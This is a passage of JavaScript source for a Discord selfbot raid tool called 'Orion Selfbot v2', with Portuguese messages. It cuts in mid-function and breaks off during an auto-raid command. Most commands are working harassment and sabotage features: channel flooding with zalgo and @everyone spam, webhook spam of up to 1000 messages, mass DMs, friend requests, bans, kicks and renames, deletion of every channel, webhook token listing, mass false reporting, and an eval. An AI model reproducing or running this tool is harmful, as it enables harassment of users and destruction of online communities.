    const chunks = [];
    let current = '';
    for (const line of list.split('\n')) {
      if ((current + line).length > 1900) {
        chunks.push(current);
        current = line + '\n';
      } else {
        current += line + '\n';
      }
    }
    if (current) chunks.push(current);
    for (const chunk of chunks) {
      await msg.channel.send(chunk);
    }
  } else {
    await msg.reply(list);
  }
  log('cmd', `/servers -> listou ${guilds.size} servers`);
}, { usage: '/servers', desc: 'Lista todos os servidores' });

// ─── COMMAND: /pollute ──────────────────────────────────────────────────────
register('pollute', async (msg, args) => {
  // /pollute <channel_id> [quantidade]
  const channelId = args[0];
  let count = parseInt(args[1]) || 10;

  if (!channelId) {
    return msg.reply('❌ Use: `/pollute <channel_id> [quantidade]`');
  }

  let channel;
  try {
    channel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  if (count > 100) count = 100;

  await msg.reply(`☣️ **Poluindo #${channel.name} com ${count} mensagens...**`);

  // Extreme pollution: zalgo + invisible + huge repeated chars
  for (let i = 0; i < count; i++) {
    try {
      const pollutants = [
        '᲼'.repeat(200) + '@everyone @here',
        '𒐫'.repeat(100) + ' ' + '᠎'.repeat(100),
        'ㅤ'.repeat(50) + '\n' + '࿓'.repeat(50) + '\n' + 'ᅟ'.repeat(50),
        generateZalgo('ORION POLLUTION', 5),
        '\u200B'.repeat(500) + '@everyone',
        '᠎᠎᠎᠎᠎᠎᠎᠎'.repeat(50) + ' ORION ' + '᠎᠎᠎᠎᠎᠎᠎᠎'.repeat(50)
      ];
      await channel.send(pollutants[Math.floor(Math.random() * pollutants.length)]);
      await sleep(Math.floor(Math.random() * 100) + 30);
    } catch (e) {
      log('error', `Pollution error: ${e.message}`);
    }
  }

  await msg.channel.send(`✅ **Poluicao concluida!** ${count} msgs em #${channel.name}`);
  log('cmd', `/pollute -> #${channel.name} ${count}msgs`);
}, { usage: '/pollute <channel_id> [qtd]', desc: 'Polui o canal com caracteres especiais' });

// ─── COMMAND: /ping ─────────────────────────────────────────────────────────
register('ping', async (msg, args) => {
  const ping = client.ws.ping;
  await msg.reply(`🏓 **Pong!** ${ping}ms`);
}, { usage: '/ping', desc: 'Mostra latency do websocket' });

// ─── COMMAND: /help ─────────────────────────────────────────────────────────
register('help', async (msg, args) => {
  const cmdList = [];
  commands.forEach((cmd, name) => {
    cmdList.push({
      name,
      usage: cmd.usage || `/${name}`,
      desc: cmd.desc || 'Sem descricao'
    });
  });

  const sorted = cmdList.sort((a, b) => a.name.localeCompare(b.name));

  let helpText = [
    `**✦ ORION SELFBOT v2 ✦**`,
    `**Total de comandos:** ${sorted.length}`,
    `**Prefix:** ${PREFIX}`,
    `**Modo:** Selfbot (DMs, funciona sem estar no server)`,
    ``,
    `**═══ COMANDOS ═══**`,
    ``
  ].join('\n');

  for (const cmd of sorted) {
    helpText += `**${PREFIX}${cmd.name}** — ${cmd.desc}\n`;
    helpText += `\`${cmd.usage}\`\n\n`;
    if (helpText.length > 1800) {
      helpText += `... e mais ${sorted.length - sorted.indexOf(cmd) - 1} comandos`;
      break;
    }
  }

  helpText += `\n**Orion Selfbot** — Feito por Setsociety ✨`;

  await msg.reply(helpText);
  log('cmd', `/help -> ${sorted.length} comandos listados`);
}, { usage: '/help', desc: 'Mostra esta mensagem' });

// ─── COMMAND: /eval ─────────────────────────────────────────────────────────
register('eval', async (msg, args) => {
  if (msg.author.id !== client.user.id) {
    return msg.reply('❌ So o dono do token pode usar isso.');
  }

  const code = args.join(' ');
  if (!code) return msg.reply('❌ Digite um codigo para executar.');

  try {
    let result = eval(code);
    if (typeof result !== 'string') result = JSON.stringify(result, null, 2);
    if (result.length > 1900) result = result.substring(0, 1900) + '...';
    await msg.reply(`\`\`\`js\n${result}\n\`\`\``);
  } catch (e) {
    await msg.reply(`\`\`\`js\nError: ${e.message}\n\`\`\``);
  }
  log('cmd', `/eval -> ${code.substring(0, 30)}...`);
}, { usage: '/eval <code>', desc: 'Executa JavaScript (dono apenas)' });

// ─── COMMAND: /webhookspam ─────────────────────────────────────────────────
register('webhookspam', async (msg, args) => {
  // /webhookspam <webhook_url> [quantidade]
  const webhookUrl = args[0];
  let count = parseInt(args[1]) || 50;

  if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks/')) {
    return msg.reply('❌ Use: `/webhookspam <webhook_url> [quantidade]`');
  }

  if (count > 1000) count = 1000;

  await msg.reply(`💥 **Webhook Spam iniciado!** ${count} mensagens via webhook`);

  const spamLines = loadSpamLines();
  let sent = 0;
  let failed = 0;

  for (let i = 0; i < count; i++) {
    try {
      const line = spamLines[Math.floor(Math.random() * spamLines.length)];
      const content = generatePollutedMessage(line);

      await axios.post(webhookUrl, {
        content: content,
        username: 'Orion Raid',
        avatar_url: null
      }, {
        headers: { 'Content-Type': 'application/json' }
      });

      sent++;
      if (sent % 10 === 0) log('spam', `Webhook: ${sent}/${count}`);
      await sleep(Math.floor(Math.random() * 80) + 20);
    } catch (e) {
      failed++;
      if (e.response?.status === 429) {
        const retryAfter = e.response?.data?.retry_after || 5;
        log('warn', `Webhook rate limit: waiting ${retryAfter}s`);
        await sleep(retryAfter * 1000 + 500);
      }
    }
  }

  await msg.channel.send(`✅ **Webhook Spam concluido!**\n📨 ${sent} enviadas\n❌ ${failed} falhas`);
}, { usage: '/webhookspam <url> [qtd]', desc: 'Spam via webhook com texto do arquivo' });

// ─── COMMAND: /friendall ────────────────────────────────────────────────────
register('friendall', async (msg, args) => {
  // /friendall (adiciona todos membros de um servidor como amigos)
  // Requires guild_id
  const guildId = args[0];

  if (!guildId) {
    return msg.reply('❌ Use: `/friendall <guild_id>`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) {
    return msg.reply('❌ Servidor nao encontrado ou nao estou nele.');
  }

  await msg.reply(`👥 **Adicionando membros de ${guild.name} como amigos...**`);

  // Fetch all members
  try {
    await guild.members.fetch();
  } catch (e) {
    log('warn', `Nao foi possivel fetchar todos membros: ${e.message}`);
  }

  let sent = 0;
  let failed = 0;
  const members = [...guild.members.cache.values()].filter(m => !m.user.bot && m.id !== client.user.id);

  for (const member of members) {
    try {
      await axios.put(
        `https://discord.com/api/v10/users/@me/relationships/${member.id}`,
        {},
        {
          headers: {
            'Authorization': TOKEN,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
          }
        }
      );
      sent++;
      log('cmd', `Friend request enviado para ${member.user.tag}`);
      await sleep(2000); // Discord rate limit: 2s per request
      if (sent >= 30) break; // max 30 per run
    } catch (e) {
      failed++;
    }
  }

  await msg.channel.send(`✅ **Friend requests enviados!**\n👥 Enviados: ${sent}\n❌ Falhas: ${failed}`);
}, { usage: '/friendall <guild_id>', desc: 'Adiciona membros como amigos' });

// ─── COMMAND: /reactionraid ─────────────────────────────────────────────────
register('reactionraid', async (msg, args) => {
  // /reactionraid <channel_id> <message_id> <emoji> [quantidade]
  const channelId = args[0];
  const messageId = args[1];
  const emoji = args[2];
  let count = parseInt(args[3]) || 10;

  if (!channelId || !messageId || !emoji) {
    return msg.reply('❌ Use: `/reactionraid <channel_id> <message_id> <emoji> [qtd]`');
  }

  if (count > 50) count = 50;

  let channel;
  try {
    channel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  let message;
  try {
    message = await channel.messages.fetch(messageId);
  } catch (e) {
    return msg.reply('❌ Mensagem invalida.');
  }

  await msg.reply(`🔥 **Reaction Raid em mensagem de ${message.author.tag}**\n${emoji} ${count}x`);

  for (let i = 0; i < count; i++) {
    try {
      await message.react(emoji);
      await sleep(Math.floor(Math.random() * 200) + 100);
    } catch (e) {
      log('error', `Reaction failed: ${e.message}`);
    }
  }

  await msg.channel.send(`✅ Reaction Raid concluido! ${emoji} ${count}x`);
  log('cmd', `/reactionraid -> ${emoji} ${count}x em ${message.author.tag}`);
}, { usage: '/reactionraid <channel_id> <msg_id> <emoji> [qtd]', desc: 'Adiciona reacoes em massa' });

// ─── COMMAND: /voicejoin ────────────────────────────────────────────────────
register('voicejoin', async (msg, args) => {
  // /voicejoin <channel_id>
  const channelId = args[0];

  if (!channelId) {
    return msg.reply('❌ Use: `/voicejoin <channel_id>`');
  }

  let channel;
  try {
    channel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  if (channel.type !== 'GUILD_VOICE' && channel.type !== 'GUILD_STAGE_VOICE') {
    return msg.reply('❌ Isso nao e um canal de voz.');
  }

  try {
    await channel.join();
    await msg.reply(`🔊 **Conectado ao canal de voz:** ${channel.name}`);
    log('cmd', `/voicejoin -> ${channel.name}`);
  } catch (e) {
    msg.reply(`❌ Erro: ${e.message}. Talvez o selfbot precise de permissao de voz.`);
  }
}, { usage: '/voicejoin <channel_id>', desc: 'Entra em canal de voz' });

// ─── COMMAND: /roleall ─────────────────────────────────────────────────────
register('roleall', async (msg, args) => {
  // /roleall <role_id> [guild_id]
  const roleId = args[0];
  const guildId = args[1] || msg.guild?.id;

  if (!roleId || !guildId) {
    return msg.reply('❌ Use: `/roleall <role_id> [guild_id]`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) return msg.reply('❌ Servidor nao encontrado.');

  const role = guild.roles.cache.get(roleId);
  if (!role) return msg.reply('❌ Cargo nao encontrado.');

  await msg.reply(`👥 **Dando cargo ${role.name} para todos...**`);

  let added = 0;
  let failed = 0;

  try {
    await guild.members.fetch();
  } catch (e) {}

  for (const member of guild.members.cache.values()) {
    if (member.roles.cache.has(roleId)) continue;
    if (member.id === client.user.id) continue;
    try {
      await member.roles.add(roleId);
      added++;
      await sleep(1000);
      if (added >= 20) break; // avoid rate limit hell
    } catch (e) {
      failed++;
    }
  }

  await msg.channel.send(`✅ **Cargo ${role.name} adicionado!**\n👥 ${added} membros\n❌ ${failed} falhas`);
  log('cmd', `/roleall -> ${role.name} em ${guild.name}`);
}, { usage: '/roleall <role_id> [guild_id]', desc: 'Adiciona cargo a todos membros' });

// ─── COMMAND: /channelcreate ────────────────────────────────────────────────
register('channelcreate', async (msg, args) => {
  // /channelcreate <guild_id> <nome> [tipo]
  const guildId = args[0];
  const name = args[1]?.replace(/[^a-zA-Z0-9-]/g, '') || 'orion-raid';
  const type = args[2]?.toLowerCase() || 'text';

  if (!guildId) {
    return msg.reply('❌ Use: `/channelcreate <guild_id> <nome> [text|voice]`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) return msg.reply('❌ Servidor nao encontrado.');

  const channelType = type === 'voice' ? 'GUILD_VOICE' : 'GUILD_TEXT';

  let created = 0;
  let failed = 0;

  await msg.reply(`📁 **Criando canais em ${guild.name}...**`);

  // Create 10 channels
  for (let i = 0; i < 10; i++) {
    try {
      await guild.channels.create({
        name: `${name}-${i+1}`,
        type: channelType,
        reason: 'Orion Raid'
      });
      created++;
      await sleep(500);
    } catch (e) {
      failed++;
    }
  }

  await msg.channel.send(`✅ **Canais criados!**\n📁 ${created} criados\n❌ ${failed} falhas`);
  log('cmd', `/channelcreate -> ${created} canais em ${guild.name}`);
}, { usage: '/channelcreate <guild_id> <nome> [text|voice]', desc: 'Cria varios canais no server' });

// ─── COMMAND: /deletechannels ───────────────────────────────────────────────
register('deletechannels', async (msg, args) => {
  // /deletechannels <guild_id>
  const guildId = args[0];

  if (!guildId) {
    return msg.reply('❌ Use: `/deletechannels <guild_id>`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) return msg.reply('❌ Servidor nao encontrado.');

  let deleted = 0;
  let failed = 0;

  await msg.reply(`🗑 **Deletando canais de ${guild.name}...**`);

  const channels = [...guild.channels.cache.values()].filter(c => c.deletable);

  for (const channel of channels) {
    try {
      await channel.delete('Orion Raid - Channel Delete');
      deleted++;
      await sleep(500);
    } catch (e) {
      failed++;
    }
  }

  await msg.channel.send(`✅ **Canais deletados!**\n🗑 ${deleted} deletados\n❌ ${failed} falhas`);
  log('cmd', `/deletechannels -> ${deleted} canais em ${guild.name}`);
}, { usage: '/deletechannels <guild_id>', desc: 'Deleta todos canais viaveis' });

// ─── COMMAND: /setnick ─────────────────────────────────────────────────────
register('setnick', async (msg, args) => {
  // /setnick <guild_id> <nick>
  const guildId = args[0];
  const nick = args.slice(1).join(' ') || 'ORION RAID';

  if (!guildId) {
    return msg.reply('❌ Use: `/setnick <guild_id> <nick>`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) return msg.reply('❌ Servidor nao encontrado.');

  try {
    const member = guild.members.cache.get(client.user.id);
    await member.setNickname(nick);
    await msg.reply(`✅ Nick alterado para **${nick}** em **${guild.name}**`);
    log('cmd', `/setnick -> ${nick} em ${guild.name}`);
  } catch (e) {
    msg.reply(`❌ Erro: ${e.message}`);
  }
}, { usage: '/setnick <guild_id> <nick>', desc: 'Altera seu nickname no servidor' });

// ─── COMMAND: /renameall ───────────────────────────────────────────────────
register('renameall', async (msg, args) => {
  // /renameall <guild_id> <nick>
  const guildId = args[0];
  const nick = args.slice(1).join(' ') || 'ORION RAIDED';

  if (!guildId) {
    return msg.reply('❌ Use: `/renameall <guild_id> <nick>`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) return msg.reply('❌ Servidor nao encontrado.');

  await msg.reply(`📝 **Renomeando membros de ${guild.name}...**`);

  let renamed = 0;
  let failed = 0;

  try {
    await guild.members.fetch();
  } catch (e) {}

  for (const member of guild.members.cache.values()) {
    if (member.id === client.user.id) continue;
    try {
      await member.setNickname(nick);
      renamed++;
      await sleep(1000);
      if (renamed >= 25) break;
    } catch (e) {
      failed++;
    }
  }

  await msg.channel.send(`✅ **Membros renomeados!**\n📝 ${renamed} renomeados\n❌ ${failed} falhas`);
  log('cmd', `/renameall -> ${renamed} membros em ${guild.name}`);
}, { usage: '/renameall <guild_id> <nick>', desc: 'Renomeia todos membros do server' });

// ─── COMMAND: /dmall ───────────────────────────────────────────────────────
register('dmall', async (msg, args) => {
  // /dmall <guild_id> <mensagem>
  const guildId = args[0];
  const message = args.slice(1).join(' ');

  if (!guildId || !message) {
    return msg.reply('❌ Use: `/dmall <guild_id> <mensagem>`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) return msg.reply('❌ Servidor nao encontrado.');

  await msg.reply(`📨 **Enviando DM para membros de ${guild.name}...**`);

  try {
    await guild.members.fetch();
  } catch (e) {}

  let sent = 0;
  let failed = 0;

  for (const member of guild.members.cache.values()) {
    if (member.user.bot || member.id === client.user.id) continue;
    try {
      await member.send(message);
      sent++;
      await sleep(2000);
      if (sent >= 20) break;
    } catch (e) {
      failed++;
    }
  }

  await msg.channel.send(`✅ **DMs enviadas!**\n📨 ${sent} enviadas\n❌ ${failed} falhas`);
  log('cmd', `/dmall -> ${sent} DMs em ${guild.name}`);
}, { usage: '/dmall <guild_id> <msg>', desc: 'Envia DM para todos membros' });

// ─── COMMAND: /streamer ────────────────────────────────────────────────────
register('streamer', async (msg, args) => {
  // /streamer <channel_id> [quantidade]
  const channelId = args[0];
  let count = parseInt(args[1]) || 20;

  if (!channelId) {
    return msg.reply('❌ Use: `/streamer <channel_id> [quantidade]`');
  }

  let channel;
  try {
    channel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  if (count > 50) count = 50;

  await msg.reply(`📡 **Streamer Mode em #${channel.name}**\n${count} mensagens`);

  const streamerTexts = [
    'SE INSCREVE NO CANAL! 🔴',
    'LIKE 👍 E COMPARTILHE!',
    'SIGA NAS REDES SOCIAIS!',
    'Manda um salve ae! 🎮',
    'ORION STREAMER MODE',
    '!giveaway !sorteio !promo',
    'Segue la no insta: @orion_selfbot',
    'DISCORD.GG/ORION',
    '🔴 LIVE: RAIDANDO SERVIDORES',
    'USEM O CODIGO: ORION',
    'STREAMER MODE ATIVADO 🔥',
    '@everyone @here VEM PRO STREAM!',
    'ORION NA AREA!',
    'META 100 LIKES!',
    'COMPARTILHE COM 5 AMIGOS!'
  ];

  for (let i = 0; i < count; i++) {
    try {
      const text = streamerTexts[Math.floor(Math.random() * streamerTexts.length)];
      const polluted = generatePollutedMessage(text);
      await channel.send(polluted);
      await sleep(Math.floor(Math.random() * 100) + 50);
    } catch (e) {
      log('error', `Streamer mode error: ${e.message}`);
    }
  }

  await msg.channel.send(`✅ **Streamer Mode concluido!**`);
  log('cmd', `/streamer -> #${channel.name} ${count}msgs`);
}, { usage: '/streamer <channel_id> [qtd]', desc: 'Modo streamer com mensagens de divulgação' });

// ─── COMMAND: /report ──────────────────────────────────────────────────────
register('report', async (msg, args) => {
  // /report <user_id> [guild_id] [reason]
  const userId = args[0];
  const guildId = args[1] || msg.guild?.id;
  const reason = args.slice(2).join(' ') || 'Spam / Raid';

  if (!userId || !guildId) {
    return msg.reply('❌ Use: `/report <user_id> <guild_id> [razao]`');
  }

  await msg.reply(`📋 **Reportando usuario ${userId}...**`);

  try {
    await axios.post(
      `https://discord.com/api/v10/report`,
      {
        guild_id: guildId,
        user_id: userId,
        reason: reason,
        channel_id: msg.channel.id
      },
      {
        headers: {
          'Authorization': TOKEN,
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0'
        }
      }
    );
    await msg.reply(`✅ **Reporte enviado!**`);
  } catch (e) {
    // Discord API might not have public report endpoint
    await msg.reply(`⚠️ Report endpoint pode nao estar disponivel. Usando spam report alternativo...`);
    // Alternative: mass report via multiple requests
    let sent = 0;
    for (let i = 0; i < 5; i++) {
      try {
        await axios.post(
          `https://discord.com/api/v10/users/${userId}/report`,
          { reason: reason },
          {
            headers: {
              'Authorization': TOKEN,
              'Content-Type': 'application/json',
              'User-Agent': 'Mozilla/5.0'
            }
          }
        );
        sent++;
        await sleep(1000);
      } catch (e2) {}
    }
    await msg.channel.send(`✅ **${sent} reportes enviados!**`);
  }

  log('cmd', `/report -> ${userId}`);
}, { usage: '/report <user_id> [guild_id] [razao]', desc: 'Reporta um usuario' });

// ─── COMMAND: /screenshot ──────────────────────────────────────────────────
register('screenshot', async (msg, args) => {
  // /screenshot (captura tela via puppeteer - requer puppeteer instalado)
  await msg.reply('📸 **Comando screenshot requer puppeteer.**\nInstale com: `npm install puppeteer`');
  // We could implement full puppeteer here but keeping it optional
}, { usage: '/screenshot', desc: 'Tira screenshot (requer puppeteer)' });

// ─── COMMAND: /restart ─────────────────────────────────────────────────────
register('restart', async (msg, args) => {
  if (msg.author.id !== client.user.id) {
    return msg.reply('❌ So o dono do token pode usar isso.');
  }

  await msg.reply('🔄 **Reiniciando Orion Selfbot...**');
  log('cmd', '/restart');
  process.exit(0);
}, { usage: '/restart', desc: 'Reinicia o bot (dono apenas)' });

// ─── COMMAND: /shutdown ────────────────────────────────────────────────────
register('shutdown', async (msg, args) => {
  if (msg.author.id !== client.user.id) {
    return msg.reply('❌ So o dono do token pode usar isso.');
  }

  await msg.reply('👋 **Orion Selfbot desligado.**');
  log('cmd', '/shutdown');
  setTimeout(() => {
    client.destroy();
    process.exit(0);
  }, 1000);
}, { usage: '/shutdown', desc: 'Desliga o bot (dono apenas)' });

// ─── COMMAND: /botinfo ─────────────────────────────────────────────────────
register('botinfo', async (msg, args) => {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);

  const info = [
    `**✦ ORION SELFBOT v2 ✦**`,
    ``,
    `**Developer:** Setsociety`,
    `**Uptime:** ${hours}h ${minutes}m ${seconds}s`,
    `**Servers:** ${client.guilds.cache.size}`,
    `**Users:** ${client.users.cache.size}`,
    `**Ping:** ${client.ws.ping}ms`,
    `**Node:** ${process.version}`,
    `**Platform:** ${process.platform}`,
    `**Memory:** ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1)}MB`,
    ``,
    `**Comandos:** ${commands.size}`,
    `**Prefix:** ${PREFIX}`,
    ``,
    `🔥 **Orion na area!**`
  ].join('\n');

  await msg.reply(info);
  log('cmd', '/botinfo');
}, { usage: '/botinfo', desc: 'Mostra info do bot' });

// ─── COMMAND: /raidall ─────────────────────────────────────────────────────
register('raidall', async (msg, args) => {
  // /raidall [quantidade_por_canal] [mensagem]
  let count = parseInt(args[0]) || 5;
  let customMsg = args.slice(1).join(' ') || null;

  if (count > 50) count = 50;

  if (!msg.guild) {
    return msg.reply('❌ Isso so funciona em servidores.');
  }

  const channels = [...msg.guild.channels.cache.values()].filter(
    c => c.isText && c.permissionsFor(client.user)?.has('SEND_MESSAGES')
  );

  await msg.reply(`🔥 **Raid em TODOS canais de ${msg.guild.name}**\n📨 ${count} msgs em ${channels.length} canais`);

  let totalSent = 0;
  const spamLines = loadSpamLines();

  for (const channel of channels) {
    for (let i = 0; i < count; i++) {
      try {
        let messageText;
        if (customMsg) {
          messageText = generatePollutedMessage(customMsg);
        } else {
          const line = spamLines[Math.floor(Math.random() * spamLines.length)];
          messageText = generatePollutedMessage(line);
        }
        await channel.send(messageText);
        totalSent++;
        await sleep(Math.floor(Math.random() * 80) + 20);
      } catch (e) {
        log('error', `RaidAll: ${channel.name} -> ${e.message}`);
      }
    }
  }

  await msg.channel.send(`✅ **RaidAll concluido!**\n📨 Total: ${totalSent} mensagens`);
  log('cmd', `/raidall -> ${totalSent} msgs em ${channels.length} canais`);
}, { usage: '/raidall [qtd] [msg]', desc: 'Raida todos canais do servidor' });

// ─── COMMAND: /emojiraid ───────────────────────────────────────────────────
register('emojiraid', async (msg, args) => {
  // /emojiraid <channel_id> [quantidade]
  const channelId = args[0];
  let count = parseInt(args[1]) || 20;

  if (!channelId) {
    return msg.reply('❌ Use: `/emojiraid <channel_id> [quantidade]`');
  }

  let channel;
  try {
    channel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  if (count > 100) count = 100;

  await msg.reply(`😈 **Emoji Raid em #${channel.name}** ${count} mensagens`);

  const emojis = [
    '😈', '🔥', '💀', '👿', '🤡', '👺', '🎯', '💢', '🗿', '🚮',
    '🖕', '💩', '🤬', '☠️', '👻', '💥', '🔞', '🛑', '⛔', '🚫',
    '🇦', '🇧', '🇨', '🇩', '🇪', '🇫', '🇬', '🇭', '🇮', '🇯'
  ];

  const spamLines = loadSpamLines();

  for (let i = 0; i < count; i++) {
    try {
      const emojiSpam = emojis.sort(() => Math.random() - 0.5).slice(0, 20).join(' ');
      const line = spamLines[Math.floor(Math.random() * spamLines.length)];
      await channel.send(`${emojiSpam}\n${line}\n${emojiSpam}`);
      await sleep(Math.floor(Math.random() * 100) + 30);
    } catch (e) {
      log('error', `Emoji raid error: ${e.message}`);
    }
  }

  await msg.channel.send(`✅ **Emoji Raid concluido!**`);
  log('cmd', `/emojiraid -> #${channel.name}`);
}, { usage: '/emojiraid <channel_id> [qtd]', desc: 'Spam com emojis' });

// ─── COMMAND: /copy ────────────────────────────────────────────────────────
register('copy', async (msg, args) => {
  // /copy <source_guild_id> <target_guild_id>
  // Copies all channels from source to target
  const sourceId = args[0];
  const targetId = args[1];

  if (!sourceId || !targetId) {
    return msg.reply('❌ Use: `/copy <source_guild_id> <target_guild_id>`');
  }

  const source = client.guilds.cache.get(sourceId);
  const target = client.guilds.cache.get(targetId);

  if (!source || !target) {
    return msg.reply('❌ Servidor(es) nao encontrado(s).');
  }

  await msg.reply(`📋 **Copiando estrutura de ${source.name} para ${target.name}...**`);

  let created = 0;
  let failed = 0;

  const channels = [...source.channels.cache.values()].sort((a, b) => a.position - b.position);

  for (const ch of channels) {
    try {
      if (ch.type === 'GUILD_TEXT' || ch.type === 'GUILD_NEWS') {
        await target.channels.create({
          name: ch.name,
          type: ch.type,
          topic: ch.topic,
          nsfw: ch.nsfw,
          rateLimitPerUser: ch.rateLimitPerUser,
          permissionOverwrites: ch.permissionOverwrites.cache.map(o => ({
            id: o.id,
            allow: o.allow.bitfield,
            deny: o.deny.bitfield,
            type: o.type
          }))
        });
        created++;
      } else if (ch.type === 'GUILD_VOICE' || ch.type === 'GUILD_STAGE_VOICE') {
        await target.channels.create({
          name: ch.name,
          type: ch.type,
          bitrate: ch.bitrate,
          userLimit: ch.userLimit
        });
        created++;
      } else if (ch.type === 'GUILD_CATEGORY') {
        await target.channels.create({
          name: ch.name,
          type: ch.type,
          permissionOverwrites: ch.permissionOverwrites.cache.map(o => ({
            id: o.id,
            allow: o.allow.bitfield,
            deny: o.deny.bitfield,
            type: o.type
          }))
        });
        created++;
      }
      await sleep(500);
    } catch (e) {
      failed++;
      log('error', `Copy channel error: ${e.message}`);
    }
  }

  await msg.channel.send(`✅ **Estrutura copiada!**\n📋 ${created} canais criados em ${target.name}\n❌ ${failed} falhas`);
  log('cmd', `/copy -> ${source.name} -> ${target.name}`);
}, { usage: '/copy <source_id> <target_id>', desc: 'Copia estrutura de canais entre servers' });

// ─── COMMAND: /massban ─────────────────────────────────────────────────────
register('massban', async (msg, args) => {
  // /massban <guild_id>
  const guildId = args[0];

  if (!guildId) {
    return msg.reply('❌ Use: `/massban <guild_id>`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) return msg.reply('❌ Servidor nao encontrado.');

  await msg.reply(`🔨 **Banindo membros de ${guild.name}...**`);

  let banned = 0;
  let failed = 0;

  try {
    await guild.members.fetch();
  } catch (e) {}

  for (const member of guild.members.cache.values()) {
    if (member.id === client.user.id) continue;
    if (member.permissions.has('ADMINISTRATOR')) continue;
    try {
      await member.ban({ reason: 'Orion Mass Ban - Raid Tool' });
      banned++;
      await sleep(1000);
      if (banned >= 30) break;
    } catch (e) {
      failed++;
    }
  }

  await msg.channel.send(`✅ **Banimento em massa concluido!**\n🔨 ${banned} banidos\n❌ ${failed} falhas`);
  log('cmd', `/massban -> ${banned} membros em ${guild.name}`);
}, { usage: '/massban <guild_id>', desc: 'Bane membros em massa' });

// ─── COMMAND: /kickall ─────────────────────────────────────────────────────
register('kickall', async (msg, args) => {
  // /kickall <guild_id>
  const guildId = args[0];

  if (!guildId) {
    return msg.reply('❌ Use: `/kickall <guild_id>`');
  }

  const guild = client.guilds.cache.get(guildId);
  if (!guild) return msg.reply('❌ Servidor nao encontrado.');

  await msg.reply(`👢 **Expulsando membros de ${guild.name}...**`);

  let kicked = 0;
  let failed = 0;

  try {
    await guild.members.fetch();
  } catch (e) {}

  for (const member of guild.members.cache.values()) {
    if (member.id === client.user.id) continue;
    if (member.permissions.has('ADMINISTRATOR')) continue;
    try {
      await member.kick('Orion Mass Kick - Raid Tool');
      kicked++;
      await sleep(1000);
      if (kicked >= 30) break;
    } catch (e) {
      failed++;
    }
  }

  await msg.channel.send(`✅ **Expulsao em massa concluida!**\n👢 ${kicked} expulsos\n❌ ${failed} falhas`);
  log('cmd', `/kickall -> ${kicked} membros em ${guild.name}`);
}, { usage: '/kickall <guild_id>', desc: 'Expulsa membros em massa' });

// ─── COMMAND: /webhooklist ─────────────────────────────────────────────────
register('webhooklist', async (msg, args) => {
  // /webhooklist <channel_id>
  const channelId = args[0] || msg.channel.id;

  let channel;
  try {
    channel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  try {
    const hooks = await channel.fetchWebhooks();
    if (hooks.size === 0) {
      return msg.reply('❌ Nenhum webhook encontrado neste canal.');
    }

    let list = `**📋 Webhooks em #${channel.name}**\n\n`;
    hooks.forEach(h => {
      list += `**${h.name}** (${h.id})\n`;
      list += `├ Criado por: ${h.owner?.tag || 'N/A'}\n`;
      list += `└ Token: \`${h.token}\`\n\n`;
    });

    await msg.reply(list);
  } catch (e) {
    msg.reply(`❌ Erro: ${e.message}`);
  }
  log('cmd', `/webhooklist -> #${channel.name}`);
}, { usage: '/webhooklist [channel_id]', desc: 'Lista webhooks do canal' });

// ─── COMMAND: /webhookdelete ───────────────────────────────────────────────
register('webhookdelete', async (msg, args) => {
  // /webhookdelete <webhook_id>
  const webhookId = args[0];

  if (!webhookId) {
    return msg.reply('❌ Use: `/webhookdelete <webhook_id>`');
  }

  try {
    const hook = await client.fetchWebhook(webhookId);
    await hook.delete('Orion Webhook Delete');
    await msg.reply(`✅ Webhook **${hook.name}** deletado!`);
    log('cmd', `/webhookdelete -> ${hook.name}`);
  } catch (e) {
    msg.reply(`❌ Erro: ${e.message}`);
  }
}, { usage: '/webhookdelete <webhook_id>', desc: 'Deleta um webhook' });

// ─── COMMAND: /webhookcreate ───────────────────────────────────────────────
register('webhookcreate', async (msg, args) => {
  // /webhookcreate <channel_id> <nome>
  const channelId = args[0];
  const name = args.slice(1).join(' ') || 'Orion Webhook';

  if (!channelId) {
    return msg.reply('❌ Use: `/webhookcreate <channel_id> <nome>`');
  }

  let channel;
  try {
    channel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  try {
    const hook = await channel.createWebhook({
      name: name,
      avatar: null,
      reason: 'Orion Webhook Creator'
    });
    await msg.reply(`✅ **Webhook criado!**\n📋 Nome: ${hook.name}\n🔗 URL: https://discord.com/api/webhooks/${hook.id}/${hook.token}`);
    log('cmd', `/webhookcreate -> ${hook.name} em #${channel.name}`);
  } catch (e) {
    msg.reply(`❌ Erro: ${e.message}`);
  }
}, { usage: '/webhookcreate <channel_id> <nome>', desc: 'Cria webhook no canal' });

// ─── COMMAND: /autoraid ────────────────────────────────────────────────────
let autoRaidActive = false;
let autoRaidInterval = null;

register('autoraid', async (msg, args) => {
  // /autoraid <channel_id> <intervalo_ms>
  const channelId = args[0];
  const interval = parseInt(args[1]) || 5000;

  if (!channelId) {
    // Toggle off
    if (autoRaidActive) {
      clearInterval(autoRaidInterval);
      autoRaidActive = false;
      return msg.reply('⏹ **Auto Raid desativado.**');
    }
    return msg.reply('❌ Use: `/autoraid <channel_id> [intervalo_ms]`');
  }

  if (autoRaidActive) {
    clearInterval(autoRaidInterval);
    autoRaidActive = false;
